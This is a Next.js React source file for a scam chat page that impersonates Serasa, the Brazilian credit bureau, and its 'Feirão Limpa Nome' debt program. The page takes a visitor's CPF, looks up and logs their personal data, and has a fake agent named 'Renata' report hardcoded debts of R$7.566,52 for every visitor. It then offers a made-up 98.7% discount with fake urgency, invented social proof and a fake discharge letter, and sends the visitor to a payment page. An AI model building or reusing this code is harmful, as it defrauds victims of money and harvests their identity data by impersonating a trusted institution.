"use client"

import { useState, useEffect, useRef } from "react"
import { useSearchParams } from "next/navigation"
import Image from "next/image"
import { Card } from "@/components/ui/card"

interface Message {
  id: string
  type: "text" | "image" | "audio" | "video" | "embed" | "data-confirmation"
  content: string
  sender: "bot" | "user"
  timestamp: Date
  delay?: number
  buttons?: Array<{
    text: string
    action: string
  }>
  data?: any
  imageUrl?: string
  audioUrl?: string
  videoUrl?: string
  embedUrl?: string
}

interface UserData {
  cpf: string
  nome: string
  nascimento: string
  mae: string
  sexo: string
  cidade: string
}

export default function ChatPage() {
  const searchParams = useSearchParams()
  const cpf = searchParams.get("cpf")
  const [messages, setMessages] = useState<Message[]>([])
  const [userData, setUserData] = useState<UserData | null>(null)
  const [currentStep, setCurrentStep] = useState(0)
  const [isLoading, setIsLoading] = useState(false)
  const [isTyping, setIsTyping] = useState(false)
  const [clickedButtons, setClickedButtons] = useState<Set<string>>(new Set())
  const messagesEndRef = useRef<HTMLDivElement>(null)

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }

  useEffect(() => {
    scrollToBottom()
  }, [messages])

  useEffect(() => {
    if (cpf) {
      initializeChatbot()
    }
  }, [cpf])

  const getUserLocation = (): string => {
    return "São Paulo"
  }

  const initializeChatbot = async () => {
    setIsLoading(true)

    try {
      const cleanCpf = cpf?.replace(/\D/g, "")

      const userCity = getUserLocation()

      const response = await fetch(`/api/user-data?cpf=${cleanCpf}`)
      const result = await response.json()

      const userData: UserData = {
        cpf: cpf || "",
        nome: result.data.nome || "Usuário",
        nascimento: result.data.nascimento || "",
        mae: result.data.mae || "",
        sexo: result.data.sexo || "",
        cidade: userCity, // Use detected city instead of hardcoded São Paulo
      }

      setUserData(userData)

      logUserInteraction(userData.cpf, "chat_started", { city: userCity, userData })

      startConversation(userData)

      if (!result.success) {
        console.log("Using fallback data due to API issues")
      }
    } catch (error) {
      console.error("Error fetching user data:", error)
      const userCity = getUserLocation()
      const fallbackData: UserData = {
        cpf: cpf || "",
        nome: "Usuário",
        nascimento: "",
        mae: "",
        sexo: "",
        cidade: userCity,
      }
      setUserData(fallbackData)
      startConversation(fallbackData)
    }

    setIsLoading(false)
  }

  const addMessageWithTyping = (message: Message, delay = 3000) => {
    setTimeout(() => {
      setIsTyping(true)
      setTimeout(() => {
        setIsTyping(false)
        setMessages((prev) => [...prev, message])

        if (message.type === "audio" && message.audioUrl) {
          setTimeout(() => {
            const audioElement = document.querySelector(`audio[data-message-id="${message.id}"]`) as HTMLAudioElement
            if (audioElement) {
              audioElement.play().catch(console.error)
            }
          }, 100)
        }
      }, delay)
    }, 100)
  }

  const startConversation = (userData: UserData) => {
    const firstName = userData.nome.split(" ")[0]

    const firstImage: Message = {
      id: "0",
      type: "image",
      content: "",
      sender: "bot",
      timestamp: new Date(),
      imageUrl:
        "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/t2s1f0xeh3om35z9nrjnb7jf-1vA424t6Q2p1WLQkyWMXU5Hymibj8F.png",
    }

    addMessageWithTyping(firstImage, 2000)

    const initialMessages: Message[] = [
      {
        id: "1",
        type: "text",
        content: `Uma atendente da sua região entrou na conversa.`,
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "2",
        type: "text",
        content: `Olá, ${firstName}!\nMe chamo Renata, serei sua atendente hoje na Serasa.`,
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "3",
        type: "text",
        content: "Vou consultar gratuitamente as ofertas disponíveis para você!",
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "4",
        type: "text",
        content: "Estou verificando seus dados, Aguarde...",
        sender: "bot",
        timestamp: new Date(),
      },
    ]

    setTimeout(() => {
      initialMessages.forEach((message, index) => {
        setTimeout(() => {
          addMessageWithTyping(message, 2000)

          if (message.id === "4") {
            setTimeout(() => {
              const fingerprintImage: Message = {
                id: "fingerprint-scan",
                type: "image",
                content: "",
                sender: "bot",
                timestamp: new Date(),
                imageUrl:
                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/r03zqdcbcd7t0h9lsuxzcl9r-vIo2YPaLzCQIS3i6lRL3cQtDh4RSB4.gif",
              }
              addMessageWithTyping(fingerprintImage, 2000)

              setTimeout(() => {
                const dataVerified: Message = {
                  id: "data-verified",
                  type: "text",
                  content: "Dados verificados com sucesso...",
                  sender: "bot",
                  timestamp: new Date(),
                }
                addMessageWithTyping(dataVerified, 2000)

                setTimeout(() => {
                  addDataConfirmationMessage(userData)
                }, 4000)
              }, 4000)
            }, 4000)
          }
        }, index * 3000)
      })
    }, 4000)
  }

  const addDataConfirmationMessage = (userData: UserData) => {
    const confirmationMessage: Message = {
      id: "data-confirmation",
      type: "data-confirmation",
      content: "Dados verificados com sucesso...\n\nAntes de prosseguirmos, confirme se seus dados estão corretos:",
      sender: "bot",
      timestamp: new Date(),
      data: userData,
      buttons: [
        {
          text: "CONFIRMAR",
          action: "confirm-data",
        },
      ],
    }

    setMessages((prev) => [...prev, confirmationMessage])
  }

  const logUserInteraction = async (cpf: string, action: string, data: any) => {
    try {
      await fetch("/api/logs", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cpf,
          action,
          data,
          timestamp: new Date().toISOString(),
        }),
      })
    } catch (error) {
      console.error("Error logging interaction:", error)
    }
  }

  const handleButtonClick = (action: string, buttonText: string) => {
    const buttonId = `${action}-${buttonText}`
    setClickedButtons((prev) => new Set([...prev, buttonId]))

    const userMessage: Message = {
      id: `user-${Date.now()}`,
      type: "text",
      content: buttonText,
      sender: "user",
      timestamp: new Date(),
    }

    setMessages((prev) => [...prev, userMessage])

    logUserInteraction(userData?.cpf || "", `button_clicked_${action}`, { buttonText })

    setTimeout(() => {
      switch (action) {
        case "confirm-data":
          continueAfterDataConfirmation()
          break
        case "quero-consultar":
          startDebtAnalysis()
          break
        case "sim-desejo":
          checkAgreements()
          break
        case "sim-quitar":
          confirmAgreement()
          break
        case "acessar-pagamento":
          redirectToPayment()
          break
      }
    }, 1500)
  }

  const continueAfterDataConfirmation = () => {
    const firstName = userData?.nome.split(" ")[0] || "Usuário"

    const nextMessages: Message[] = [
      {
        id: "welcome",
        type: "text",
        content: `${firstName}, seja bem-vindo(a) ao atendimento Feirão Limpa Nome da Serasa!`,
        sender: "bot",
        timestamp: new Date(),
      },
      {
        id: "protocol",
        type: "text",
        content: "Protocolo do atendimento: AMY3PK8JS",
        sender: "bot",
        timestamp: new Date(),
      },
    ]

    nextMessages.forEach((message, index) => {
      setTimeout(
        () => {
          addMessageWithTyping(message, 2000)

          if (message.id === "protocol") {
            setTimeout(() => {
              const lastDayBanner: Message = {
                id: "last-day-banner",
                type: "image",
                content: "",
                sender: "bot",
                timestamp: new Date(),
                imageUrl:
                  "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/imagem-2025-06-02-220849093-gXe5072GbkjqMj6qzHzucTqlxbPp7S.png",
              }
              addMessageWithTyping(lastDayBanner, 2000)

              setTimeout(() => {
                const lastDayMessage: Message = {
                  id: "last-day",
                  type: "text",
                  content:
                    "Último dia do Feirão limpa nome em sua região.\n\nDeseja consultar as ofertas disponíveis para o seu CPF?",
                  sender: "bot",
                  timestamp: new Date(),
                  buttons: [
                    {
                      text: "Quero Consultar",
                      action: "quero-consultar",
                    },
                  ],
                }
                addMessageWithTyping(lastDayMessage, 2000)
              }, 4000)
            }, 4000)
          }
        },
        (index + 1) * 3000,
      )
    })
  }

  const startDebtAnalysis = () => {
    const analysisMessage: Message = {
      id: "analyzing",
      type: "text",
      content: "Por favor, aguarde enquanto analiso a situação de seu CPF em nossos sistemas..",
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(analysisMessage, 2000)

    setTimeout(() => {
      const animatedGif: Message = {
        id: "financial-life-gif",
        type: "image",
        content: "",
        sender: "bot",
        timestamp: new Date(),
        imageUrl:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/yvu93mi2pr47dwsd6utu3bwn-1-eYO2cEVEgAqrnd0TU6SrdJefLEVp1L.gif",
      }
      addMessageWithTyping(animatedGif, 2000)

      setTimeout(() => {
        const analysisComplete: Message = {
          id: "analysis-complete",
          type: "text",
          content: "Análise concluída!",
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(analysisComplete, 2000)

        setTimeout(() => {
          showDebtResults()
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const showDebtResults = () => {
    const firstName = userData?.nome.split(" ")[0] || "Usuário"
    const cpfFormatted = userData?.cpf || ""

    const debtMessage: Message = {
      id: "debt-results",
      type: "text",
      content: `${firstName}, identifiquei aqui 3 dívidas ativas no sistema.\n\nOs valores variam entre R$528,74 a R$5.237,78\nTotalizando uma dívida ativa de R$7.566,52 em seu CPF.\n\nSituação para o CPF ${cpfFormatted}: NEGATIVADO.\n\nDevido a alta taxa de Juros imposta pelo governo, suas dívidas estão se multiplicando rapidamente!`,
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(debtMessage, 2000)

    setTimeout(() => {
      const firstAudio: Message = {
        id: "first-audio",
        type: "audio",
        content: "",
        sender: "bot",
        timestamp: new Date(),
        audioUrl:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/g03ygdj5oj1kuc1smp1cgx2x-itY8rQg5gU2qFuOzIVmpAr4U30WfQx.mp3",
      }
      addMessageWithTyping(firstAudio, 2000)

      setTimeout(() => {
        const creditScoreImage: Message = {
          id: "credit-score",
          type: "image",
          content: "",
          sender: "bot",
          timestamp: new Date(),
          imageUrl:
            "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Capturar%20%281%29-V6xQThBN8z41WmHTIvFQgatFy3pgYY.png",
        }
        addMessageWithTyping(creditScoreImage, 2000)

        setTimeout(() => {
          const verificationQuestion: Message = {
            id: "verification-question",
            type: "text",
            content: "Deseja verificar se existe algum acordo disponível para você?",
            sender: "bot",
            timestamp: new Date(),
            buttons: [
              {
                text: "Sim, Desejo",
                action: "sim-desejo",
              },
            ],
          }
          addMessageWithTyping(verificationQuestion, 2000)
        }, 4000)
      }, 7000)
    }, 4000)
  }

  const checkAgreements = () => {
    const searchingMessage: Message = {
      id: "searching-agreements",
      type: "text",
      content: "Aguarde um instante enquanto verifico aqui no sistema se existem acordos disponíveis para você...",
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(searchingMessage, 2000)

    setTimeout(() => {
      const checkmarkImage: Message = {
        id: "checkmark",
        type: "image",
        content: "",
        sender: "bot",
        timestamp: new Date(),
        imageUrl:
          "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Capturar2-Us2rfDwlpKeS7ZMXvmETuwpsIJ4PbM.png",
      }
      addMessageWithTyping(checkmarkImage, 2000)

      setTimeout(() => {
        const newsMessage: Message = {
          id: "news",
          type: "text",
          content:
            "Notícia:\nSomente hoje, mais de 12.872 mil brasileiros negociaram suas dívidas no Feirão Limpa Nome Serasa online!",
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(newsMessage, 2000)

        setTimeout(() => {
          const videoEmbed: Message = {
            id: "video-embed",
            type: "video",
            content: "",
            sender: "bot",
            timestamp: new Date(),
            videoUrl: "https://player.vimeo.com/video/1032300787?badge=0&autopause=0&player_id=0&app_id=58479",
          }
          addMessageWithTyping(videoEmbed, 2000)

          setTimeout(() => {
            showAgreementDetails()
          }, 18000)
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const showAgreementDetails = () => {
    const agreementFound: Message = {
      id: "agreement-found",
      type: "text",
      content:
        "Acordo encontrado!\n\n1 (um) acordo foi encontrado para:\n\n" + `${userData?.nome} (CPF ${userData?.cpf})`,
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(agreementFound, 2000)

    setTimeout(() => {
      const accessingAgreement: Message = {
        id: "accessing-agreement",
        type: "text",
        content: "Acessando o acordo, 83N2L618362E aguarde...",
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(accessingAgreement, 2000)

      setTimeout(() => {
        const today = new Date().toLocaleDateString("pt-BR")
        const agreementInfo: Message = {
          id: "agreement-info",
          type: "text",
          content: `Informações de acordo 83N2L618362E para:\n\n${userData?.nome}, (CPF ${userData?.cpf}):\n\nAcordo: 83N2L618362E\n\nValor Total da Dívida: R$ 7.566,52\n\nValor do Contrato: R$78,47\n\nDesconto Total: 98,7% (R$ 7.488,05)\n\nData de Vencimento: ${today}\n\nO contrato atual é válido apenas para o titular:\n${userData?.nome}\n\nPortador(a) do CPF:\n${userData?.cpf}`,
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(agreementInfo, 2000)

        setTimeout(() => {
          const appInterfaceImage: Message = {
            id: "debt-offers-app",
            type: "image",
            content: "",
            sender: "bot",
            timestamp: new Date(),
            imageUrl:
              "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Capturar23-wU6nxu4g2IZVPqWygtLdlJaJQNbI6e.png",
          }
          addMessageWithTyping(appInterfaceImage, 2000)

          setTimeout(() => {
            const secondAudio: Message = {
              id: "second-audio",
              type: "audio",
              content: "",
              sender: "bot",
              timestamp: new Date(),
              audioUrl:
                "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/xurd2lz77g2r2cypw37j1wab-nu5w6XH0ufVUnH7S5ZN2FBAPUVGMgr.mp3",
            }
            addMessageWithTyping(secondAudio, 2000)

            setTimeout(() => {
              const finalQuestion: Message = {
                id: "final-question",
                type: "text",
                content: "Deseja realizar o acordo e ter seu nome limpo ainda hoje?",
                sender: "bot",
                timestamp: new Date(),
                buttons: [
                  {
                    text: "Sim, desejo quitar minhas dívidas.",
                    action: "sim-quitar",
                  },
                ],
              }
              addMessageWithTyping(finalQuestion, 2000)
            }, 21000)
          }, 4000)
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const confirmAgreement = () => {
    const confirmingMessage: Message = {
      id: "confirming",
      type: "text",
      content: "Confirmando o acordo...",
      sender: "bot",
      timestamp: new Date(),
    }

    addMessageWithTyping(confirmingMessage, 2000)

    setTimeout(() => {
      const serasaInfo: Message = {
        id: "serasa-info",
        type: "text",
        content: `SERASA INFORMA:\nAo efetuar o pagamento do acordo, todas as dívidas em aberto no CPF ${userData?.cpf} serão removidas em 1 hora, e você terá o seu nome limpo novamente!`,
        sender: "bot",
        timestamp: new Date(),
      }
      addMessageWithTyping(serasaInfo, 2000)

      setTimeout(() => {
        const congratulations: Message = {
          id: "congratulations",
          type: "text",
          content: "Parabéns!\nSeu acordo foi confirmado.",
          sender: "bot",
          timestamp: new Date(),
        }
        addMessageWithTyping(congratulations, 2000)

        setTimeout(() => {
          const thirdAudio: Message = {
            id: "third-audio",
            type: "audio",
            content: "",
            sender: "bot",
            timestamp: new Date(),
            audioUrl:
              "https://s3.nanoemprendimentos.com/typebot/public/workspaces/cmefs990p0000p31e2ba5tf3o/typebots/n7xogdiq33hovm9aejw8s7w5/blocks/yge0z942zfxmvdrwpx9wqgza?v=1755956222323",
          }
          addMessageWithTyping(thirdAudio, 2000)

          setTimeout(() => {
            const paymentProofEmbed: Message = {
              id: "payment-proof-embed",
              type: "embed",
              content: "",
              sender: "bot",
              timestamp: new Date(),
              embedUrl: `https://cerulean-bavarois-8fa9a8.netlify.app/proof-2/?name=${encodeURIComponent(userData?.nome || "")}&cpf=${encodeURIComponent(userData?.cpf || "")}&value=78,47`,
            }
            addMessageWithTyping(paymentProofEmbed, 3000)

            setTimeout(() => {
              const paymentGenerated: Message = {
                id: "payment-generated",
                type: "text",
                content: `A guia de pagamento foi gerada para o acordo 83N2L618362E!\n\nBeneficiário(a):\n${userData?.nome}\n\nIdentificação (CPF):\n${userData?.cpf}`,
                sender: "bot",
                timestamp: new Date(),
              }
              addMessageWithTyping(paymentGenerated, 2000)

              setTimeout(() => {
                const paymentButton: Message = {
                  id: "payment-button",
                  type: "text",
                  content: "Clique no botão a seguir para acessar a guia de pagamento",
                  sender: "bot",
                  timestamp: new Date(),
                  buttons: [
                    {
                      text: "ACESSAR ÁREA DE PAGAMENTO SEGURO 🔒",
                      action: "acessar-pagamento",
                    },
                  ],
                }
                addMessageWithTyping(paymentButton, 2000)
              }, 4000)
            }, 4000)
          }, 10000)
        }, 4000)
      }, 4000)
    }, 4000)
  }

  const redirectToPayment = () => {
    window.open("https://checkout-page-url.com", "_blank")
  }

  if (!cpf) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <Card className="p-8 text-center">
          <h1 className="text-xl font-semibold text-gray-800 mb-4">CPF não encontrado</h1>
          <p className="text-gray-600">Por favor, volte e insira seu CPF novamente.</p>
        </Card>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="sticky top-0 z-50 bg-pink-600 text-white p-4 shadow-lg">
        <div className="max-w-4xl mx-auto flex items-center gap-3">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
            alt="Serasa"
            width={120}
            height={40}
            className="h-8 w-auto"
          />
          <div className="flex-1">
            <h1 className="font-semibold">Atendimento Serasa</h1>
            <p className="text-sm opacity-90">Renata - Consultora Online</p>
          </div>
          <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
            <div className="w-2 h-2 bg-white rounded-full"></div>
          </div>
        </div>
      </div>

      <div className="max-w-4xl mx-auto bg-white min-h-[calc(100vh-80px)] relative">
        <div className="p-4 space-y-4 pb-20">
          {isLoading && (
            <div className="flex justify-center py-8">
              <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-600"></div>
            </div>
          )}

          {messages.map((message) => (
            <div key={message.id}>
              <div className={`flex ${message.sender === "bot" ? "justify-start" : "justify-end"}`}>
                <div className="max-w-xs lg:max-w-md">
                  <div
                    className={`flex items-start gap-2 mb-2 ${message.sender === "bot" ? "flex-row" : "flex-row-reverse"}`}
                  >
                    <div
                      className={`w-8 h-8 ${message.sender === "bot" ? "bg-pink-600" : "bg-blue-500"} rounded-full flex items-center justify-center text-white text-sm font-semibold`}
                    >
                      {message.sender === "bot" ? (
                        <Image
                          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
                          alt="Serasa"
                          width={32}
                          height={32}
                          className="w-8 h-8 rounded-full"
                        />
                      ) : (
                        userData?.nome?.charAt(0).toUpperCase() || "U"
                      )}
                    </div>
                    <div className="flex-1">
                      <div
                        className={`${message.sender === "bot" ? "bg-pink-100 border-pink-200" : "bg-blue-100 border-blue-200"} rounded-lg p-3 border`}
                      >
                        {message.type === "image" && message.imageUrl && (
                          <div className="mb-2">
                            <Image
                              src={message.imageUrl || "/placeholder.svg"}
                              alt=""
                              width={300}
                              height={200}
                              className="rounded-lg w-full"
                            />
                          </div>
                        )}

                        {message.type === "audio" && message.audioUrl && (
                          <div className="mb-2">
                            <div className="bg-white rounded-lg p-4 border shadow-sm w-full min-w-[280px]">
                              <div className="flex items-center gap-3 mb-3">
                                <div className="w-12 h-12 bg-pink-600 rounded-full flex items-center justify-center">
                                  <Image
                                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Consultar%20%281%29-o4Y7eRRCDu3SkbteFPG7ff8dH1ylEj.png"
                                    alt="Audio"
                                    width={24}
                                    height={24}
                                    className="w-6 h-6"
                                  />
                                </div>
                                <div className="flex-1">
                                  <p className="text-sm font-medium text-gray-800">Áudio da Renata</p>
                                  <p className="text-xs text-gray-500">Mensagem de voz</p>
                                </div>
                              </div>
                              <audio
                                controls
                                className="w-full h-10"
                                data-message-id={message.id}
                                autoPlay
                                style={{
                                  accentColor: "#ec4899",
                                  filter: "sepia(100%) saturate(200%) hue-rotate(300deg)",
                                }}
                              >
                                <source src={message.audioUrl} type="audio/mpeg" />
                                Seu navegador não suporta áudio.
                              </audio>
                            </div>
                          </div>
                        )}

                        {message.type === "video" && message.videoUrl && (
                          <div className="mb-2">
                            <iframe
                              src={message.videoUrl}
                              width="300"
                              height="200"
                              frameBorder="0"
                              allow="autoplay; fullscreen; picture-in-picture"
                              className="rounded-lg w-full"
                            ></iframe>
                          </div>
                        )}

                        {message.type === "embed" && message.embedUrl && (
                          <div className="mb-2">
                            <iframe
                              src={message.embedUrl}
                              width="300"
                              height="400"
                              frameBorder="0"
                              className="rounded-lg w-full border"
                              title="Carta de Quitação"
                            ></iframe>
                          </div>
                        )}

                        {message.type === "data-confirmation" ? (
                          <div>
                            <p className="text-sm text-gray-800 mb-4">{message.content}</p>
                            {message.data && (
                              <div className="bg-white rounded p-3 mb-4 text-sm border">
                                <p>
                                  <strong>Nome:</strong> {message.data.nome}
                                </p>
                                <p>
                                  <strong>Identificação (CPF):</strong> {message.data.cpf}
                                </p>
                                <p>
                                  <strong>Data de Nascimento:</strong> {message.data.nascimento}
                                </p>
                                <p>
                                  <strong>Nome da Mãe:</strong> {message.data.mae}
                                </p>
                                <p>
                                  <strong>Sexo:</strong> {message.data.sexo}
                                </p>
                              </div>
                            )}
                          </div>
                        ) : (
                          <div>
                            <p className="text-sm text-gray-800 whitespace-pre-line">{message.content}</p>
                          </div>
                        )}
                      </div>
                      <p
                        className={`text-xs text-gray-500 mt-1 ${message.sender === "bot" ? "text-left" : "text-right"}`}
                      >
                        {message.timestamp.toLocaleTimeString("pt-BR", {
                          hour: "2-digit",
                          minute: "2-digit",
                        })}
                      </p>
                    </div>
                  </div>
                </div>
              </div>

              {message.buttons && (
                <div className="flex justify-end mt-2 mb-4">
                  <div className="space-y-2 max-w-xs">
                    {message.buttons
                      .filter((button) => {
                        const buttonId = `${button.action}-${button.text}`
                        return !clickedButtons.has(buttonId)
                      })
                      .map((button, index) => (
                        <div
                          key={index}
                          onClick={() => handleButtonClick(button.action, button.text)}
                          className="bg-blue-500 hover:bg-blue-600 text-white rounded-lg px-4 py-3 cursor-pointer shadow-md hover:shadow-lg transition-all duration-200 text-sm font-medium border border-blue-400 animate-pulse"
                        >
                          {button.text}
                        </div>
                      ))}
                    {message.buttons.some((button) => {
                      const buttonId = `${button.action}-${button.text}`
                      return !clickedButtons.has(buttonId)
                    }) && <div className="text-xs text-gray-400 text-right mt-1">Toque para enviar</div>}
                  </div>
                </div>
              )}
            </div>
          ))}

          {isTyping && (
            <div className="flex justify-start">
              <div className="max-w-xs lg:max-w-md">
                <div className="flex items-start gap-2 mb-2 flex-row">
                  <div className="w-8 h-8 bg-pink-600 rounded-full flex items-center justify-center text-white text-sm font-semibold">
                    <Image
                      src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/unnamed-mc1cq9oGl94BkoUSXsitt93EG7m1IA.png"
                      alt="Serasa"
                      width={32}
                      height={32}
                      className="w-8 h-8 rounded-full"
                    />
                  </div>
                  <div className="flex-1">
                    <div className="bg-pink-100 border-pink-200 rounded-lg p-3 border">
                      <div className="flex space-x-1">
                        <div className="w-2 h-2 bg-pink-400 rounded-full animate-bounce"></div>
                        <div
                          className="w-2 h-2 bg-pink-400 rounded-full animate-bounce"
                          style={{ animationDelay: "0.1s" }}
                        ></div>
                        <div
                          className="w-2 h-2 bg-pink-400 rounded-full animate-bounce"
                          style={{ animationDelay: "0.2s" }}
                        ></div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>
      </div>
    </div>
  )
}
